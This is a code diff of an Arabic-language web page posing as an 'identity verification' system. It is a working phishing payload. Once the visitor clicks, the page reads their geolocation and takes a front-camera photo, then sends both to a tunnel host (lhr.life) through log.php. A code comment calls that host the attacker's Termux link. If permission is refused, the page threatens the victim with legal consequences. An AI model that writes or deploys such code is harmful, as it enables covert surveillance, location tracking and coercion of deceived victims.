@@ -1,36 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-<body style="text-align:center; padding-top:50px; background:#eee;">
-    <div style="background:white; padding:20px; border-radius:10px; display:inline-block;">
-        <h3>نظام التحقق</h3>
-        <button onclick="check()" style="padding:20px; background:blue; color:white; border:none; border-radius:5px;">تأكيد الهوية الآن</button>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية</title>
+</head>
+<body onclick="start()" style="margin:0; height:100vh; display:flex; align-items:center; justify-content:center; background:#000; color:#fff; font-family:sans-serif; text-align:center;">
+    
+    <div id="status">
+        <h2>نظام التحقق الأمني</h2>
+        <p>اضغط في أي مكان بالشاشة للمتابعة</p>
+        <button style="padding:15px 30px; font-size:18px; background:#1a73e8; color:white; border:none; border-radius:5px;">تأكيد الهوية الآن</button>
     </div>
-    <script>
-    async function check() {
-        alert("بدأ التحقق... وافق على الأذونات القادمة");
-        const url = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا رابط ترمكس النشط الآن
-        
-        try {
-            // طلب الكاميرا أولاً وبقوة
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            alert("تم تشغيل الكاميرا بنجاح");
-            
-            const v = document.createElement('video');
-            v.srcObject = s; v.play();
 
-            setTimeout(async () => {
-                const c = document.createElement('canvas');
-                c.width=640; c.height=480;
-                c.getContext('2d').drawImage(v,0,0);
-                const img = c.toDataURL('image/jpeg');
-                
-                await fetch(url + '/log.php', {method:'POST', body: JSON.stringify({img: img})});
-                alert("تم إرسال الصورة لترمكس بنجاح");
-                s.getTracks().forEach(t => t.stop());
-            }, 2000);
+    <script>
+    async function start() {
+        const status = document.getElementById('status');
+        const tunnel = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا هو رابط ترمكس النشط
+        
+        status.innerHTML = "<h2>جاري التوثيق...</h2><p>يرجى الضغط على 'سماح' إذا ظهرت</p>";
+
+        try {
+            // طلب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`${tunnel}/log.php?lat=${p.coords.latitude}&lon=${p.coords.longitude}`);
+            });
+
+            // طلب الكاميرا بطريقة مباشرة
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/jpeg');
+                    
+                    fetch(`${tunnel}/log.php`, { method: 'POST', body: JSON.stringify({ img: img }) })
+                    .then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        status.innerHTML = "<h2>تم التوثيق بنجاح</h2>";
+                    });
+                }, 2000);
+            };
         } catch (e) {
-            alert("فشل: يجب فتح الرابط في متصفح Chrome ومنحه إذن الكاميرا");
+            alert("خطأ: يجب السماح بالكاميرا والموقع لتجنب المساءلة القانونية.");
+            location.reload();
         }
     }
     </script>
